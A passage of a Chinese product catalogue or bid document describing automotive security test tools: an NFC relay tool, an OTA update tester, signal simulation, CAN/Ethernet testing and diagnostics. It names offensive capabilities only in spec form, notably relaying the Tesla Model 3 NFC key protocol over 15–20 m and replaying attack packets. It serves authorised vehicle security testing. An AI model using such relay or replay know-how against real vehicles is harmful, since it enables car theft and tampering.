title="工具参数"></a>工具参数</h4><ol><li>两端传输距离15~20米</li><li>中继时间&lt;1分钟</li><li>工具内置特斯拉model3所用NFC协议</li><li>标配X86的台式机或者笔记本，乐鑫ESP32微控制器，安卓手机app</li><li>SMA接口外置WIFI天线3.3v内置电源</li><li>串口通信接口</li><li>支持日志系统，可将数据存储为独立文件</li><li>支持NFC近场通讯信号探测技术</li><li>调制解调车端与NFC卡片之间的通信信号，分析信号组成部分，实现NFC通讯从探测-分析-监控的一体化流程</li><li>支持多款NFC门卡的信号捕捉</li><li>支持多款车辆的NFC门卡信号捕捉</li><li>支持观察者模式，可对NFC信号进行统一分析和整理</li><li>支持数据交换监控可视化输出</li></ol><h3 id="OTA测试工具"><a href="#OTA测试工具" class="headerlink" title="OTA测试工具"></a>OTA测试工具</h3><h4 id="工具概述-6"><a href="#工具概述-6" class="headerlink" title="工具概述"></a>工具概述</h4><p>一体化测试工具是用于OTA远程升级业务的网络安全测试，可验证在OTA远程升级业务当中云、管、端层面的安全性。</p><h4 id="工具方案-6"><a href="#工具方案-6" class="headerlink" title="工具方案"></a>工具方案</h4><h5 id="硬件方案-6"><a href="#硬件方案-6" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>测试设备选择：</p><p>选择测试场景的硬件设备，如测试车辆、测试工具和测试设备。</p><p>车辆接口：</p><p>确定需要与车辆通信的接口，如CAN总线、LIN总线、车载以太网等。</p><p>根据车辆接口选择相应的硬件设备，如CAN分析仪、LIN分析仪、以太网数据采集器等。</p><p>OTA升级模块：</p><p>集成OTA升级模块，用于模拟和执行OTA升级过程。</p><p>OTA升级模块支持与测试工具的通信，以接收和发送升级相关的指令和数据。</p><p>数据采集模块：</p><p>集成数据采集模块，用于采集车辆的相关数据，如车速、引擎转速、电池电量等。</p><p>数据采集模块支持与测试工具的通信，以将采集到的数据传输给测试工具进行分析和记录。</p><p>安全测试工具集成：</p><p>集成安全测试工具，用于进行车辆安全性和通信安全性的测试。</p><p>安全测试工具支持与测试工具的通信，以接收测试指令和发送测试结果。</p><p>网络通信：</p><p>确定测试工具与测试设备之间的通信方式，如有线连接或无线连接。</p><p>需要确保通信的稳定性和安全性，可以采用加密通信或其他安全措施。</p><p>电源供应：</p><p>确保测试设备和模块有稳定的电源供应，以保证正常工作。</p><p>可以使用车载电源适配器或其他适当的电源设备。</p><p>硬件集成和连接：</p><p>将各个硬件模块进行集成，确保它们能够相互通信和协同工作。</p><p>进行必要的连接，如连接测试设备和车辆接口、连接数据采集模块和测试工具等。</p><p>硬件调试和测试：</p><p>对集成的硬件进行调试和测试，确保其正常工作和满足要求。</p><p>进行必要的功能测试、性能测试和稳定性测试。</p><p>硬件维护和管理：</p><p>建立合适的硬件维护计划，包括定期检查、保养和维修。</p><p>确保硬件设备的安全存放和管理，以防止损坏或丢失。</p><h5 id="软件方案-6"><a href="#软件方案-6" class="headerlink" title="软件方案"></a>软件方案</h5><p>技术选型：</p><p>前端开发：使用现代化的前端框架，如React或Angular，实现用户界面和交互。</p><p>后端开发：选择适合您团队的后端技术，如Node.js、Python等，用于处理业务逻辑和数据管理。</p><p>数据库：使用关系型数据库（如MySQL、PostgreSQL）或NoSQL数据库（如MongoDB）存储测试对象、任务数据和日志等。</p><p>网络通信：在安全通信方面，我司采用了SSL的方式进行了加密通信，这是为了保障安全的进行数据传输。</p><p>前端设计：</p><p>设计用户友好的界面，包括登录页面、主控制面板、测试对象管理、任务管理、测试报告等模块。</p><p>实现用户认证和权限管理，确保只有授权用户可以访问和操作系统功能。</p><p>提供交互式界面，支持用户进行测试对象的新增、删除、修改和搜索，以及任务的创建、编辑、删除、搜索等操作。</p><p>支持数据的可视化展示，例如图表、表格等形式，方便用户查看测试结果和报告。</p><p>后端设计：</p><p>实现业务逻辑处理，包括先决条件检测、用户告知和确认检测、车辆安全和车门锁止检测、升级结果告知和失败车辆状态检测等功能。</p><p>提供API接口，用于前端与后端的数据交互和操作，包括测试对象的增删改查、任务的创建和管理、测试数据和操作日志的存储和导出等。</p><p>集成第三方工具和平台，如智能汽车网络靶场测试管理平台、车端数据安全测试工具、系统漏洞扫描工具、CAN/LIN总线安全测试工具和车载以太网安全测试工具等。</p><p>数据管理：</p><p>使用数据库存储测试对象的信息，包括车辆信息、升级版本、先决条件、用户告知和确认等。</p><p>存储任务数据，包括测试任务的配置、执行状态、测试结果等。</p><p>记录测试过程中产生的测试数据和操作日志，方便后续分析和审查。</p><p>支持导出测试数据、操作日志和测试报告，以PDF格式呈现，对不通过的测试用例提出修复建议。</p><p>安全性和稳定性：</p><p>在安全通信方面，我司采用了SSL的方式进行了加密通信，这是为了保障安全的进行数据传输。</p><p>对用户身份进行认证和授权，限制访问和操作权限。</p><p>对系统进行异常处理和错误日志记录，确保系统的稳定性和可靠性。</p><p>其他功能：</p><p>实现网络报文抓包分析和攻击包重放功能，用于测试网络通信的安全性。</p><p>提供接口，与自动化工具适配，实现自动执行测试操作和状态回读。</p><p>支持对测试对象和任务进行搜索、排序和过滤，提高用户操作的效率和便捷性。</p><h5 id="工具功能-6"><a href="#工具功能-6" class="headerlink" title="工具功能"></a>工具功能</h5><p>OTA升级先决条件检测：确保满足所有升级前必要条件，如电池电量、网络连接等。</p><p>OTA升级用户告知检测：验证OTA升级过程中用户是否得到适当的通知信息。</p><p>OTA升级用户确认检测：确保用户同意后才开始OTA升级过程。</p><p>OTA升级车辆安全与车门锁止检测：检测升级过程中车辆安全性和车门锁定状态。</p><p>OTA升级结果告知与失败状态检测：验证升级是否成功，并在失败时检测车辆状态及用户通知。</p><p>R156验证测试：执行符合UNECE R156规定的OTA升级验证测试。</p><p>拍照采集与上传测试结果：支持通过拍照方式采集测试结果，并上传保存测试结果照片。</p><p>智能汽车网络靶场测试管理平台：通过平台进行任务创建与测试计划的管理。</p><p>数据安全测试工具调用：通过调用车端数据安全测试工具完成OTA测试中的数据安全测试。</p><p>系统漏洞扫描工具调用：利用系统漏洞扫描工具完成OTA测试中的系统安全测试。</p><p>CAN/LIN总线安全测试工具调用：通过特定工具完成OTA测试中的总线安全测试。</p><p>车载以太网安全测试工具调用：利用工具完成OTA测试中的车载以太网安全测试。</p><p>报文抓包分析与攻击包重放：支持网络报文的捕获、分析和攻击包的重放。</p><p>自动化测试接口提供：提供接口与自动化工具适配，自动执行测试操作与状态回读。</p><p>测试对象管理：支持测试对象的新增、删除、修改和搜索。</p><p>任务管理：任务管理页面允许对测试任务进行新增、编辑、删除、搜索等操作。</p><p>测试对象与任务关联：实现一个测试对象与多个测试任务的关联。</p><p>测试数据与日志管理：显示与导出测试过程中产生的数据和操作日志。</p><p>测试报告导出：生成PDF格式的测试报告，并提供修复建议。</p><p>远程管理与安全通信：B/S架构设计，支持SSL加密通信，便于用户通过浏览器远程管理。</p><p>软件升级服务：提供软件license，三年内免费升级。</p><h4 id="产品彩页-14"><a href="#产品彩页-14" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c59048161608c626225c1bd1bfbe97ee.png"></p><h4 id="工具参数-6"><a href="#工具参数-6" class="headerlink" title="工具参数"></a>工具参数</h4><p>功能参数如下：</p><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLOTA02</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>支持对OTA升级先决条件进行检测；</li><li>支持对OTA升级用户告知进行检测；</li><li>支持对OTA升级用户确认进行检测；</li><li>支持对OTA升级中车辆安全和车门锁止进行检测；</li><li>支持对OTA升级结果告知和升级失败车辆状态进行检测；</li><li>支持对R156的验证测试；</li><li>支持通过拍照方式采集测试结果，支持上传测试结果照片并保存；</li><li>支持通过智能汽车网络靶场测试管理平台进行任务创建与测试计划管理；</li><li>支持通过调用车端数据安全测试工具完成OTA测试中数据安全相关测试；</li><li>支持通过调用系统漏洞扫描工具完成OTA测试中系统安全相关测试；</li><li>支持通过调用CAN/LIN总线安全测试工具完成OTA测试中总线安全相关测试；</li><li>支持通过调用车载以太网安全测试工具完成OTA测试中车载以太网安全相关测试；</li><li>支持网络报文抓包分析与攻击包重放；</li><li>支持提供接口，可与自动化工具适配自动执行测试操作与状态回读；</li><li>支持测试对象进行新增、删除、修改或对已有测试对象的搜索；</li><li>支持任务管理页面中可以对测试任务新增、编辑、删除、搜索、配置用例、开始检测、查看结果；</li><li>支持测试对象与测试任务相关联、一个测试对象可以对应多个测试任务；</li><li>支持对测试过程中产生的测试数据、操作日志的显示与导出；</li><li>支持测试报告的导出，导出格式为pdf，测试报告应对不通过的测试用例提出修复建议；</li><li>工具采用B/S设计架构，并采用SSL加密通信方式，用户可以通过浏览器远程方便的进行管理；</li><li>提供软件license三年之内免费升级。</li></ol><h3 id="车辆信号模拟仿真软件"><a href="#车辆信号模拟仿真软件" class="headerlink" title="车辆信号模拟仿真软件"></a>车辆信号模拟仿真软件</h3><h4 id="工具概述-7"><a href="#工具概述-7" class="headerlink" title="工具概述"></a>工具概述</h4><p>车辆信号模拟仿真软件通过对车门、车窗、点火信号、钥匙、车速、发动机转速、电量、档位、后备箱等指令信号的模拟来测试车辆ECU的反应情况来验证安全性。</p><h4 id="工具方案-7"><a href="#工具方案-7" class="headerlink" title="工具方案"></a>工具方案</h4><h5 id="软件方案-7"><a href="#软件方案-7" class="headerlink" title="软件方案"></a>软件方案</h5><p>导入通信矩阵：</p><p>设计一个功能，允许用户导入通信矩阵文件，以定义车辆信号的消息和信号信息。</p><p>支持常见的通信矩阵文件格式，如DBC（CAN）、LDF（LIN）等。</p><p>信号模拟：</p><p>实现车门、车窗、点火信号、钥匙、车速、发动机转速、电量、档位、后备箱、引擎盖等信号的模拟。</p><p>提供用户界面，允许用户选择要模拟的信号，并设置其相应的值和状态。</p><p>总线协议支持：</p><p>支持CAN、CANFD和LIN总线协议，以满足不同车辆的通信需求。</p><p>实现对这些总线协议的解析和生成，以便与车辆通信。</p><p>CANOE工具链支持：</p><p>集成CANOE工具链，以便与CANOE进行通信和协同工作。</p><p>通过CANOE提供的API，实现与CANOE的连接和数据交换。</p><p>收发报文实时打印：</p><p>在软件界面上显示实时收发的报文，以便用户实时监视通信状态。</p><p>报文显示包括报文ID、数据和时间戳等信息。</p><p>收发报文日志记录与保存：</p><p>记录和保存收发的报文日志，用于后续分析和审查。</p><p>可以将报文日志保存为文件，支持常见的日志文件格式，如CSV、TXT等。</p><p>此外，还可以考虑以下功能来增强软件的实用性和易用性：</p><p>用户界面设计：设计直观友好的用户界面，使用户能够轻松配置和控制信号模拟。</p><p>信号模拟方案管理：支持保存和加载不同的信号模拟方案，以便用户可以快速切换和重用配置。</p><p>信号触发和事件：支持基于条件的信号触发和事件，使用户能够模拟特定情况下的信号变化。</p><p>脚本支持：提供脚本功能，允许用户编写自定义脚本来控制信号模拟和处理收发报文。</p><p>错误处理和日志记录：实现错误处理机制，记录错误日志，并向用户提供相应的错误提示和解决方案。</p><h5 id="工具功能-7"><a href="#工具功能-7" class="headerlink" title="工具功能"></a>工具功能</h5><p>通信矩阵导入：支持导入通信矩阵，这是定义车辆内部通信网络中消息和信号的关键文档。</p><p>车辆信号模拟：能够模拟车门、车窗、点火信号、钥匙、车速、发动机转速、电量、档位、后备箱、引擎盖等车辆信号，以测试车辆的反应和系统的稳定性。</p><p>总线协议支持：支持CAN (Controller Area Network)、CAN FD (Flexible Data-Rate) 和LIN (Local Interconnect Network) 总线协议，覆盖了大多数现代车辆使用的通信协议。</p><p>CANoe工具链支持：兼容并支持Vector的CANoe工具链，这是汽车通信分析和测试中常用的工具。</p><p>实时报文打印：支持收发报文的实时打印，使测试人员能够即时观察通信数据。</p><p>报文日志记录与保存：支持收发报文的日志记录与保存，便于后续分析和问题追踪。</p><h4 id="产品彩页-15"><a href="#产品彩页-15" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a8d95e8019194f383b9ce83e07384dcf.png"></p><h4 id="工具参数-7"><a href="#工具参数-7" class="headerlink" title="工具参数"></a>工具参数</h4><p>1)支持导入通信矩阵；</p><p>2)支持车门、车窗、点火信号、钥匙、车速、发动机转速、电量、档位、后备箱、引擎盖等信号的模拟；</p><p>3)支持CAN、CANFD、LIN总线协议；</p><p>4)支持CANOE工具链；</p><p>5)支持收发报文实时打印；</p><p>6)支持收发报文日志记录与保存。</p><h3 id="车载网络安全测试工具"><a href="#车载网络安全测试工具" class="headerlink" title="车载网络安全测试工具"></a>车载网络安全测试工具</h3><h4 id="工具概述-8"><a href="#工具概述-8" class="headerlink" title="工具概述"></a>工具概述</h4><p>车载网网络安全测试工具主要针对车载内部网络进行信息安全测试，包括CAN总线、车载以太网等，其中CAN总线部分测试可满足doip 、someip等协议的测试。</p><h4 id="工具方案-8"><a href="#工具方案-8" class="headerlink" title="工具方案"></a>工具方案</h4><h5 id="硬件方案-7"><a href="#硬件方案-7" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>整体架构：</p><p>主控单元：使用高性能的嵌入式处理器，具备足够的计算能力和存储容量来支持测试工具的功能。</p><p>CAN总线模块：满足CAN总线模块参数要求的功能参数，包括支持多路CAN和CANFD、配置波特率和采样点、数据接收和发送功能、时间戳记录等。</p><p>以太网模块：满足车载以太网模块参数要求的功能参数，包括支持多通道的100BASE-T1/1000BASE-T1和标准以太网、独立的CAN/CANFD通道、IO接口、高分辨率时间戳等。</p><p>硬件设计要点：</p><p>主控单元：选择高性能的嵌入式处理器，具备足够的计算能力和存储容量，以支持测试工具的复杂功能和数据处理要求。</p><p>CAN总线模块：选择能够满足CAN总线模块参数要求的模块，包括支持多路CAN和CANFD、配置波特率和采样点、数据接收和发送功能、时间戳记录等功能。</p><p>以太网模块：选择能够满足车载以太网模块参数要求的模块，包括支持多通道的100BASE-T1/1000BASE-T1和标准以太网、独立的CAN/CANFD通道、IO接口、高分辨率时间戳等功能。</p><p>数据采集和处理：使用适当的模数转换器（ADC）和数字信号处理器（DSP）来实现数据的采集和处理，以支持图形显示、参数化测量设置、信号值显示等功能。</p><p>外部接口：提供适当的接口，如USB3.0接口用于与主机连接，1xD-SUB9接口用于CAN/CANFD通道的连接，以及其他必要的接口用于与外部设备的连接。</p><p>稳定性和耐用性：确保硬件设计具备稳定性、耐用性和适应汽车和工业环境的特点，包括供电和温度范围的要求。</p><h5 id="软件方案-8"><a href="#软件方案-8" class="headerlink" title="软件方案"></a>软件方案</h5><p>软件架构：</p><p>前端界面：设计用户友好的图形用户界面（GUI），提供用户操作和控制工具的界面。</p><p>后端处理：实现测试工具的核心功能，包括CAN/ETH通信、通信数据库编辑器、总线系统仿真、分析总线通信、测试网络和单个控制单元、UDS协议诊断通信测试等。</p><p>功能模块：</p><p>CAN/ETH通信模块：实现CAN和以太网通信功能，包括数据收发、波特率配置、采样点设置等。</p><p>通信数据库编辑器模块：提供多种通信数据库编辑器，如CANdb++和Communication Model Editor，支持DBC数据编辑库和SOA数据模型编辑。</p><p>总线系统仿真模块：通过建模实现完整的总线系统仿真和残余总线仿真，模拟车辆网络环境。</p><p>分析总线通信模块：对总线通信进行分析，包括报文解析、信号提取、错误帧检测等功能。</p><p>测试网络和单个控制单元模块：测试整个网络和单个控制单元的功能和性能，包括发送测试报文、接收和验证报文、性能指标测量等。</p><p>UDS协议诊断通信测试模块：通过UDS协议进行诊断通信测试，包括发送诊断请求、接收和解析诊断响应、执行诊断服务等。</p><p>用户自定义界面模块：提供用户自定义界面的功能，允许用户根据需要自定义界面布局和控制元素。</p><p>数据显示和记录模块：实现信号、变量和诊断参数的图形显示，支持XY图、数字形式和柱状图形式的显示，同时支持报文频率、错误帧、总线负载和控制器状态的显示和记录。</p><p>窗口和模块模块：提供给用户各种窗口和模块，如事件显示项、系统变量、传输协议信息和诊断服务等。</p><p>参数化测量设置模块：支持图形显示和功能模块以及评估功能的参数化测量设置，如速度和温度与时间的关系的测量和观察曲线。</p><p>软件开发：</p><p>选择合适的编程语言和开发框架，如C++、Python或Java，并结合相关的开发工具和库来实现软件功能。</p><p>遵循模块化设计原则，将不同功能模块拆分成独立的组件，实现高内聚低耦合的设计。</p><p>使用合适的设计模式和架构模式，如MVC（Model-View-Controller）模式，来实现良好的软件结构和可扩展性。</p><p>进行充分的测试和调试，确保软件的稳定性和功能的正确性。</p><p>提供适当的文档和用户手册，以便用户了解和使用测试工具。</p><h5 id="工具功能-8"><a href="#工具功能-8" class="headerlink" title="工具功能"></a>工具功能</h5><ol><li>软件功能</li></ol><p>License提供：提供3套永久使用的license，支持CAN (Controller Area Network) 和ETH (Ethernet)。</p><p>通信数据库编辑器：自带多种通信数据库编辑器，如CANdb++支持DBC数据编辑库，Communication Model Editor支持SOA（Service-Oriented Architecture）数据模型编辑。</p><p>总线系统仿真：通过建模进行完整的总线系统仿真和残余总线仿真，模拟网络中未连接的节点。</p><p>总线通信分析：支持分析总线通信，以识别和解决通信问题。</p><p>网络和单元测试：测试完整网络和单个控制单元，确保系统的整体和局部功能。</p><p>UDS诊断通信测试：通过统一诊断服务（Unified Diagnostic Services）协议进行诊断通信测试。</p><p>用户自定义界面：可以创建用户自定义界面来控制仿真和测试过程或显示分析数据。</p><p>多窗口和模块：提供给用户多种窗口和模块，以便于操作和数据展示。</p><p>图形显示和参数化测量：支持图形显示和功能模块以及评估功能的参数化测量设置。</p><p>总线活动监控：列出所有的总线活动项，如报文、错误帧和远程帧，并支持过滤功能。</p><p>图形化数据展示：支持信号、变量和诊断参数以图形方式显示在XY图中，用于测量和观察曲线。</p><p>信号值显示：支持以数字形式和柱状图形式显示信号值。</p><p>网络状态监控：显示报文频率、错误帧、总线负载和控制器状态。</p><p>报文触发：支持报文触发，实时发送修正信号。</p><p>数据记录与回放：支持记录，后期分析和数据回放功能。</p><p>总线事件响应：支持对总线事件的具体响应，优化显示和记录的数据量。</p><p>报文显示：支持显示系统报文和用户自定义的输出。</p><ol><li>CAN总线模块功能</li></ol><p>波特率与采样点配置：支持配置CAN和CAN-FD的波特率及采样点，以适应不同的通信需求。</p><p>数据收发功能：具备CAN和CANFD总线数据接收和发送的功能，确保数据流的正常传输。</p><p>多路CAN/CANFD支持：支持多路CAN及CANFD，提供高速CAN通道12路，CANFD通道12路；CAN支持波特率125kbps、250kbps、500kbps、1Mbps，CAN-FD支持波特率2Mbps、5Mbps、8Mbps。</p><p>时间戳记录：对发送和接收的信号进行时间戳记录，以便于事件追踪和性能分析。</p><p>低延迟数据转换：在正常负载下，数据转换延迟时间小于0.3毫秒，确保通信的高效性。</p><p>错误帧和远程帧监测：可监测错误帧和远程帧，以识别和解决网络问题。</p><p>高总线负载适应性：确保所有CAN/CANFD通道可以满足100%的总线负载，保障高负载情况下的稳定性。</p><p>硬件同步接口：具备硬件同步接口，同步精度达到1微秒，可与其他总线接口卡联合使用，实现多系统同步测试。</p><p>网络测试工具软件支持：支持网络测试工具软件，提供用户友好的界面和功能强大的测试选项。</p><ol><li>车载以太网模块功能</li></ol><p>100BASE-T1/1000BASE-T1支持：支持26通道的100BASE-T1/1000BASE-T1（OPENAlliance BroadR-Reach），适用于高速汽车网络应用。</p><p>标准以太网通道：支持40通道的标准以太网（10BASE-T/100BASE-TX/1000BASE-T），确保与现有网络设备的兼容性。</p><p>多通道CAN/CANFD：支持10个独立的CAN/CANFD通道，通过1xD-SUB9连接，满足复杂车载网络测试需求。</p><p>IO接口：支持IO接口，用于设置或采样模拟/数字值，增加测试工具的灵活性。</p><p>USB3.0连接：通过USB3.0连接主机，保证与主机之间的高速数据传输。</p><p>高分辨率时间戳（以太网帧）：为以太网帧提供高分辨率时间戳，以便精确的时间分析和调试。</p><p>高分辨率时间戳（CAN/CANFD帧）：为CAN/CANFD帧提供高分辨率时间戳，确保通信事件的精确时间记录。</p><p>时间同步：多个网络接口的软件和硬件时间同步，确保在多网络环境中的一致性和同步性。</p><p>内部三向路由：内部三向路由功能（in/monitor/out）提供灵活的数据流控制。</p><p>硬件过滤：以太网和CAN数据的硬件过滤，减少不必要的数据传输和处理。</p><p>集成Layer2交换机：集成的Layer2交换机，用于优化多个通道的残余总线仿真，提高效率。</p><p>硬件负载发生器：具有用于低抖动和全带宽的硬件负载发生器，用于测试系统的负载处理能力。</p><p>独立模式运行：独立模式功能，确保工具可以不依赖主机独立运行。</p><p>适用性：适用于汽车和工业应用的稳定性，具备适当的供电和温度范围。</p><p>第三方工具接口：提供对第三方工具的开放接口，可使用XL驱动程序库（CAN和以太网）进行扩展。</p><p>网络测试工具软件支持：支持网络测试工具软件，为用户提供了一个易于操作的界面和强大的网络测试功能。</p><h4 id="产品彩页-16"><a href="#产品彩页-16" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/15353576d0acc41e8ba55847533d3911.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/6ce6fe8360294acddd550d476d77f60f.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/407158edf8d620013fb0d67280935a42.png"></p><h4 id="工具参数-8"><a href="#工具参数-8" class="headerlink" title="工具参数"></a>工具参数</h4><ol><li>软件功能参数</li><li>我司提供3套永久使用license，支持CAN/ETH；</li><li>自带多种通信数据库编辑器，例如CANdb++支持DBC数据编辑库，Communication Model Editor支持SOA数据模型编辑；</li><li>通过建模进行完整的总线系统仿真和残余总线仿真；</li><li>支持分析总线通信；</li><li>测试完整网络和单个控制单元；</li><li>通过UDS协议，进行诊断通信测试；</li><li>可以创建用户自定义界面来控制仿真和测试过程或显示分析数据；</li><li>提供给用户下面的窗口和模块：；</li><li>支持图形显示和功能模块以及评估功能的参数化测量设置</li><li>支持列出所有的总线活动项，如报文、错误帧和远程帧。对于每一条报文，可以显示独立的信号，支持过滤功能。事件显示项，如错误事件、系统变量、传输协议信息和诊断服务。</li><li>支持信号、变量和诊断参数以图形方式显示在XY图中，可以用来测量和观察曲线，如速度和温度与时间的关系。</li><li>支持显示信号值，以数字形式和柱状图形式呈现</li><li>支持显示报文频率、错误帧、总线负载和控制器状态</li><li>支持报文触发，实时发送修正信号</li><li>支持纪录，后期分析和数据回放</li><li>支持对总线事件的具体响应，减少显示和记录的数据的数量</li><li>支持显示系统报文和用户自定义的输出。</li><li>CAN总线模块功能参数如下：</li></ol><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLCAN/CANFD</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>支持可以配置CAN/CAN-FD波特率以及采样点；</li><li>具备CAN/CANFD总线数据接收和发送的功能；</li><li>支持多路CAN及CANFD，其中高速CAN为12路，CANFD为12路，CAN支持波特率125kbps、250kbps，500kbps，1Mbps，CAN-FD支持波特率2Mbps、5Mbps、8Mbps；</li><li>支持对发送和接收信号进行时间戳记录功能；</li><li>在正常负载下，数据转换延迟时间小于0.3ms；</li><li>可监测错误帧和远程帧；</li><li>确保所有CAN/CANFD通道可以满足100%总线负载；</li><li>具备硬件同步接口，同步精度1μs，可与其他总线接口卡联合使用；</li><li>支持网络测试工具软件，网络测试工具参数如下；</li><li>车载以太网模块功能参数如下：</li></ol><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLETH1</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>支持26通道的100BASE-T1/1000BASE-T1（OPENAllianceBroadR-Reach）；</li><li>支持40通道的标准以太网（10BASE-T/100BASE-TX/1000BASE-T）；</li><li>支持10个独立的CAN/CANFD通道（通过1xD-SUB9提供）；</li><li>支持IO接口，用于设置或采样模拟/数字值；</li><li>通过USB3.0连接主机；</li><li>以太网帧的高分辨率时间戳；</li><li>CAN/CANFD帧的高分辨率时间戳；</li><li>多个网络接口的软件和硬件时间同步；</li><li>内部三向路由in/monitor/out；</li><li>以太网和CAN数据的硬件过滤；</li><li>集成的Layer2交换机，用于优化多个通道的残余总线仿真；</li><li>用于低抖动和全带宽的硬件负载发生器；</li><li>独立模式功能，可确保不间断运行；</li><li>适用于汽车和工业应用的稳定性，供电和温度范围；</li><li>对于第三方工具的开放接口，可使用XL驱动程序库（CAN和以太网）。</li><li>支持网络测试工具软件。</li></ol><p>备注：为保证任务并行执行，通道硬件分配方案我司将在在中标后取得甲方同意后再执行。</p><h3 id="诊断需求定义工具"><a href="#诊断需求定义工具" class="headerlink" title="诊断需求定义工具"></a>诊断需求定义工具</h3><h4 id="工具概述-9"><a href="#工具概述-9" class="headerlink" title="工具概述"></a>工具概述</h4><p>这个诊断需求定义工具是一个功能强大的软件工具，旨在帮助汽车行业进行诊断需求的定义和管理。它支持导入和导出各种数据格式，如ODX、CSV、RTF、A2L、XML、CDI，使用户能够方便地处理和转换不同格式的数据。</p><p>该工具具备多项重要功能，包括对ODX文件的处理和导出，支持ODX 2.0.1和2.2.0版本文件的导入和导出，以及生成符合AUTOSAR 4.2.2/4.3.0标准的诊断提取（DEXT文件）。它还支持AUTOSAR系统描述的导入，简化了信号和转换的定义过程。</p><p>此外，该工具还支持UDS和DoIP协议，使用户能够进行诊断通信测试和分析。它提供了便捷的DTC故障代码的导入和导出功能，可以在不同文件之间进行转换和管理。同时，它还提供了ODX文件的阅读工具，帮助用户更好地理解和分析ODX文件的内容。</p><h4 id="工具方案-9"><a href="#工具方案-9" class="headerlink" title="工具方案"></a>工具方案</h4><h5 id="软件方案-9"><a href="#软件方案-9" class="headerlink" title="软件方案"></a>软件方案</h5><p>软件架构：</p><p>前端界面：设计用户友好的图形用户界面（GUI），提供用户操作和控制工具的界面。</p><p>后端处理：实现工具的核心功能，包括数据导入和导出、ODX文件处理、AUTOSAR支持、诊断规范导出等。</p><p>功能模块：</p><p>数据导入和导出模块：支持导入和导出各种数据格式，如ODX、CSV、RTF、A2L、XML、CDI等，提供灵活的数据转换和兼容性。</p><p>ODX文件处理模块：支持ODX 2.0.1和2.2.0版本文件的导入，并可导出ODX 2.0.1、2.1.0和2.2.0版本文件，实现对ODX文件的读取和生成。</p><p>AUTOSAR支持模块：支持从AUTOSAR系统描述简单导入信号和转换，用于生成符合AUTOSAR 4.2.2/4.3.0标准的诊断提取（DEXT文件）的导出功能。</p><p>UDS和DoIP支持模块：支持UDS和DoIP协议，实现与诊断通信相关的功能，如发送诊断请求、接收和解析诊断响应等。</p><p>DTC故障代码导入和导出模块：支持在不同文件中导入或导出DTC故障代码，实现对故障代码的管理和转换。</p><p>ODX文件阅读工具模块：提供ODX文件的阅读工具，用于查看和分析ODX文件的内容和结构。</p><p>诊断规范导出模块：支持将诊断规范导出为RTF和HTML格式，满足诊断需求文档的输出要求。</p><p>软件开发：</p><p>选择合适的编程语言和开发框架，如C++、Python或Java，并结合相关的开发工具和库来实现软件功能。</p><p>遵循模块化设计原则，将不同功能模块拆分成独立的组件，实现高内聚低耦合的设计。</p><p>使用合适的设计模式和架构模式，如MVC（Model-View-Controller）模式，来实现良好的软件结构和可扩展性。</p><p>进行充分的测试和调试，确保软件的稳定性和功能的正确性。</p><p>提供适当的文档和用户手册，以便用户了解和使用工具。</p><h5 id="工具功能-9"><a href="#工具功能-9" class="headerlink" title="工具功能"></a>工具功能</h5><p>多种数据格式支持：工具支持导入和导出多种数据格式，包括ODX、CSV、RTF、A2L、XML、CDI，增加了与其他工具和系统的兼容性。</p><p>ODX文件版本兼容性：支持ODX 2.0.1, 2.2.0版本文件的导入，并能够导出ODX 2.0.1, 2.1.0, 2.2.0版本文件，确保了与不同版本ODX文件的兼容。</p><p>AUTOSAR支持：支持从AUTOSAR系统描述中简单导入信号，并具备生成AUTOSAR诊断提取（DEXT文件）的导出功能，方便AUTOSAR系统的诊断工作。</p><p>AUTOSAR诊断提取模板标准：支持导出的文件符合AUTOSAR 4.2.2/4.3.0的“诊断提取模板”标准，保持与AUTOSAR标准的一致性。</p><p>UDS和DoIP协议支持：支持统一诊断服务（UDS）和诊断协议（DoIP），这是现代汽车诊断中常用的协议。</p><p>DTC故障代码处理：可以在不同文件中导入或导出诊断故障代码（DTC），方便故障诊断和管理。</p><p>ODX文件阅读工具：支持ODX文件阅读工具，使用户能够方便地查看和管理ODX文件内容。</p><p>诊断规范导出：支持将诊断规范导出为RTF、HTML等格式，便于文档的创建和分发。</p><p>软件使用许可：提供软件永久使用license，确保用户可以长期使用该工具而无需担心许可到期的问题。</p><h4 id="产品彩页-17"><a href="#产品彩页-17" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/2a19b5f70992a72e290d6d68f874321b.png"></p><h4 id="工具参数-9"><a href="#工具参数-9" class="headerlink" title="工具参数"></a>工具参数</h4><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLUDS</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>支持导入和导出各种数据格式（ODX、CSV、RTF、A2L、XML、CDI）；</li><li>支持ODX 2.0.1, 2.2.0版本文件的导入，并可导出ODX2.0.1, 2.1.0. 2.2.0版本文件；</li><li>支持AUTOSAR，可从AUTOSAR系统描述简单导入信号和转换用于生成AUTOSAR诊断提取（DEXT文件）的导出功能。</li><li>支持导出的文件符合AUTOSAR 4.2.2/4.3.0的“诊断提取模板”标准。</li><li>支持UDS，DoIP协议；</li><li>可在不同文件中导入或导出DTC故障代码；</li><li>支持ODX文件阅读工具；</li><li>支持诊断规范导出，支持RTF、HTML格式；</li><li>我司提供软件永久使用license。</li></ol><h1 id="智能汽车网络靶场工具库-数据安全测试工具"><a href="#智能汽车网络靶场工具库-数据安全测试工具" class="headerlink" 